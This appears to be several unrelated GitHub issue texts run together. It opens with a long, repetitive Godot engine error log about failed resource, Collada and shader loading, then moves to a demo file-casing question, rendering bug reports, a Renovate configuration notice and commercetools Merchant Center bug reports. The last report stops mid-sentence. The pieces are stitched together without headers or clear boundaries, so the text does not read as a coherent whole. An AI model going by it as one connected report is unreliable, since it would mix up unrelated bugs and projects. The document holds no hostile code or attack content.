ERROR: _load_data: Condition ' !f ' is true. returned: ERR_CANT_OPEN
   At: scene/resources/texture.cpp:473.
ERROR: _load: Failed loading resource: res://.import/blue_myst.png-a59eaeb96ee90691546f89f775275d4e.s3tc.stex
   At: core/io/resource_loader.cpp:192.
ERROR: _load: Failed loading resource: res://player/blue_myst.png
   At: core/io/resource_loader.cpp:192.
ERROR: load_interactive: Condition ' err != OK ' is true. returned: Ref<ResourceInteractiveLoader>()
   At: core/io/resource_format_binary.cpp:997.
ERROR: _load: Failed loading resource: res://.import/fx_bullet_explodewav.wav-2ec4dd7affd5c245450642b3c823b81f.sample
   At: core/io/resource_loader.cpp:192.
ERROR: _load: Failed loading resource: res://player/fx_bullet_explodewav.wav
   At: core/io/resource_loader.cpp:192.
ERROR: _load_data: Condition ' !f ' is true. returned: ERR_CANT_OPEN
   At: scene/resources/texture.cpp:473.
ERROR: _load: Failed loading resource: res://.import/blue_myst.png-a59eaeb96ee90691546f89f775275d4e.s3tc.stex
   At: core/io/resource_loader.cpp:192.
ERROR: _load: Failed loading resource: res://player/blue_myst.png
   At: core/io/resource_loader.cpp:192.
WARNING: _parse_ext_resource: Couldn't load external resource: res://player/blue_myst.png
   At: scene/resources/scene_format_text.cpp:174.
ERROR: load_interactive: Condition ' err != OK ' is true. returned: Ref<ResourceInteractiveLoader>()
   At: core/io/resource_format_binary.cpp:997.
ERROR: _load: Failed loading resource: res://.import/fx_bullet_explodewav.wav-2ec4dd7affd5c245450642b3c823b81f.sample
   At: core/io/resource_loader.cpp:192.
ERROR: _load: Failed loading resource: res://player/fx_bullet_explodewav.wav
   At: core/io/resource_loader.cpp:192.
WARNING: _parse_ext_resource: Couldn't load external resource: res://player/fx_bullet_explodewav.wav
   At: scene/resources/scene_format_text.cpp:174.
WARNING: _png_warn_function: iCCP: known incorrect sRGB profile
   At: drivers/png/image_loader_png.cpp:67.
WARNING: load_image: Ignoring unsupported header information in HDR : GAMMA=1
   At: modules/hdr/image_loader_hdr.cpp:55.
WARNING: load_image: Ignoring unsupported header information in HDR : PRIMARIES=0 0 0 0 0 0 0 0
   At: modules/hdr/image_loader_hdr.cpp:55.
WARNING: _png_warn_function: iCCP: known incorrect sRGB profile
   At: drivers/png/image_loader_png.cpp:67.
ERROR: _parse_material_library: Condition ' !f ' is true. returned: ERR_CANT_OPEN
   At: editor/import/resource_importer_obj.cpp:48.
WARNING: _parse_material_library: OBJ: Ambient light for material 'Material.001' is ignored in PBR
   At: editor/import/resource_importer_obj.cpp:66.
ERROR: _parse_material_library: Condition ' !f ' is true. returned: ERR_CANT_OPEN
   At: editor/import/resource_importer_obj.cpp:48.
WARNING: _parse_material_library: OBJ: Ambient light for material 'EvilRobo' is ignored in PBR
   At: editor/import/resource_importer_obj.cpp:66.
ERROR: _load: No loader found for resource: /home/red/coding/godot/Desktop/RobotMalo/EvilRobo-BaseColor.png
   At: core/io/resource_loader.cpp:192.
ERROR: _parse_material_library: Condition ' !f ' is true. returned: ERR_CANT_OPEN
   At: editor/import/resource_importer_obj.cpp:48.
WARNING: _parse_material_library: OBJ: Ambient light for material 'EvilRobo' is ignored in PBR
   At: editor/import/resource_importer_obj.cpp:66.
ERROR: _load: No loader found for resource: /home/red/coding/godot/Desktop/RobotMalo/EvilRobo-BaseColor.png
   At: core/io/resource_loader.cpp:192.
WARNING: _parse_material_library: OBJ: Ambient light for material 'ShadelessBlack' is ignored in PBR
   At: editor/import/resource_importer_obj.cpp:66.
ERROR: _load: No loader found for resource: /home/red/coding/godot/Desktop/RobotMalo/EvilRobo-BaseColor.png
   At: core/io/resource_loader.cpp:192.
WARNING: _png_warn_function: iCCP: known incorrect sRGB profile
   At: drivers/png/image_loader_png.cpp:67.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load_interactive: Condition ' err != OK ' is true. returned: Ref<ResourceInteractiveLoader>()
   At: core/io/resource_format_binary.cpp:997.
ERROR: _load: Failed loading resource: res://.import/player.dae-5611407abdadd55b4ab0ac0830102352.scn
   At: core/io/resource_loader.cpp:192.
ERROR: _load: Failed loading resource: res://player/player.dae
   At: core/io/resource_loader.cpp:192.
ERROR: load_interactive: Condition ' err != OK ' is true. returned: Ref<ResourceInteractiveLoader>()
   At: core/io/resource_format_binary.cpp:997.
ERROR: _load: Failed loading resource: res://.import/player.dae-5611407abdadd55b4ab0ac0830102352.scn
   At: core/io/resource_loader.cpp:192.
ERROR: _load: Failed loading resource: res://player/player.dae
   At: core/io/resource_loader.cpp:192.
WARNING: _parse_ext_resource: Couldn't load external resource: res://player/player.dae
   At: scene/resources/scene_format_text.cpp:174.
ERROR: remove_scene: Index p_idx=1 out of size (edited_scene.size()=1)
   At: editor/editor_data.cpp:564.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
ERROR: load: Condition ' err != OK ' is true. returned: ERR_FILE_CORRUPT
   At: editor/collada/collada.cpp:2538.
ERROR: load: Condition ' err ' is true. returned: err
   At: editor/import/editor_import_collada.cpp:1397.
ERROR: import_scene: Condition ' err != OK ' is true. returned: __null
   At: editor/import/editor_import_collada.cpp:1916.
ERROR: get_multiple_md5: Condition ' !f ' is true. Continuing..:
   At: core/os/file_access.cpp:582.
ERROR: get_dependencies: Condition ' !f ' is true.
   At: core/io/resource_format_binary.cpp:1047.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
0 
SHADER ERROR: (null): Expected 'shader_type' at the beginning of shader.
   At: :1.
ERROR: _update_shader: Condition ' err != OK ' is true.
   At: drivers/gles3/rasterizer_storage_gles3.cpp:1913.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_BaseColor.png
   At: core/io/resource_loader.cpp:192.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_OcclusionRoughnessMetallic.png
   At: core/io/resource_loader.cpp:192.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_Normal.png
   At: core/io/resource_loader.cpp:192.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_BaseColor.png
   At: core/io/resource_loader.cpp:192.
WARNING: parse_variant: Couldn't load resource: res://props/proptextures/cajachica_DefaultMaterial_BaseColor.png
   At: core/io/resource_format_binary.cpp:360.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_OcclusionRoughnessMetallic.png
   At: core/io/resource_loader.cpp:192.
WARNING: parse_variant: Couldn't load resource: res://props/proptextures/cajachica_DefaultMaterial_OcclusionRoughnessMetallic.png
   At: core/io/resource_format_binary.cpp:360.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_OcclusionRoughnessMetallic.png
   At: core/io/resource_loader.cpp:192.
WARNING: parse_variant: Couldn't load resource: res://props/proptextures/cajachica_DefaultMaterial_OcclusionRoughnessMetallic.png
   At: core/io/resource_format_binary.cpp:360.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_Normal.png
   At: core/io/resource_loader.cpp:192.
WARNING: parse_variant: Couldn't load resource: res://props/proptextures/cajachica_DefaultMaterial_Normal.png
   At: core/io/resource_format_binary.cpp:360.
ERROR: _load: No loader found for resource: res://props/proptextures/cajachica_DefaultMaterial_OcclusionRoughnessMetallic.png
   At: core/io/resource_loader.cpp:192.
WARNING: parse_variant: Couldn't load resource: res://props/proptextures/cajachica_DefaultMaterial_OcclusionRoughnessMetallic.png
   At: core/io/resource_format_binary.cpp:360.
``` One of the files in the demo exists twice with different casing. Which one is the right one? Could we remove the duplicate?

![image](https://user-images.githubusercontent.com/1311555/46671139-ea081d00-cbcb-11e8-932c-d631cfffdbe7.png)
 These have been seen on a GTX 660 as well as an RX Vega M. Tested on both windows and linux, with both latest build on hugo.pro as well as beta 3:
A: Missing left arm padding for player
B: Missing left leg padding for enemies
C: Particle effects are not visible for orb

A + B:
![peek 2019-02-04 22-40](https://user-images.githubusercontent.com/3120639/52206406-3b03f580-28ce-11e9-8d33-e66f17dbef6c.gif)

C:
![peek 2019-02-04 22-41](https://user-images.githubusercontent.com/3120639/52206418-435c3080-28ce-11e9-853f-02d34e6ffcca.gif)


<---------->
152089521
There is an error with this repository's Renovate configuration that needs to be fixed. As a precaution, Renovate will stop PRs until it is resolved.

Error type: undefined
 **Describe the bug**
When you log into MC and access a project with a registered custom application the Icon and Title of the custom app are displayed when on the Welcome page and the Dashboard page. If you navigate to any of the other tabs like products list, orders list etc. you can no longer see the custom application in the menu. 

**To Reproduce**
Steps to reproduce the behavior:

1. Log into MC and to a project with a registered custom app and observe in the Nav
2. Navigate to the Orders List page 
3. Observe left navigation and that the custom app Icon and title are no longer displayed

**Expected behavior**
Custom App Icon and Title Should be viewable from any other page or tab in the MC. 

**Additional context**
Appears to be reproducible on any project or custom app. 
 **Describe the bug**
Package @commercetools-frontend/l10n

Adding any of the [addedd countries](https://github.com/commercetools/merchant-center-application-kit/pull/988/files#diff-b9cfc7f2cdf78a7f4b91a753d10865a2) in  #988
 e.g `cg-alt-variant `, `un-alt-short `, ...`us-alt-short` in the zones
causes issue.
![issue](https://user-images.githubusercontent.com/7680511/64244358-2e4d8b80-cf09-11e9-99a0-199e8af7fc94.gif)
After checking the Graphql definition for the ZoneLocation
- ![image](https://user-images.githubusercontent.com/7680511/64244559-91d7b900-cf09-11e9-9ada-6a62f7f5c81d.png)
- ![image](https://user-images.githubusercontent.com/7680511/64244649-b764c280-cf09-11e9-86fe-0b541a8a551f.png)


So the supported codes are those
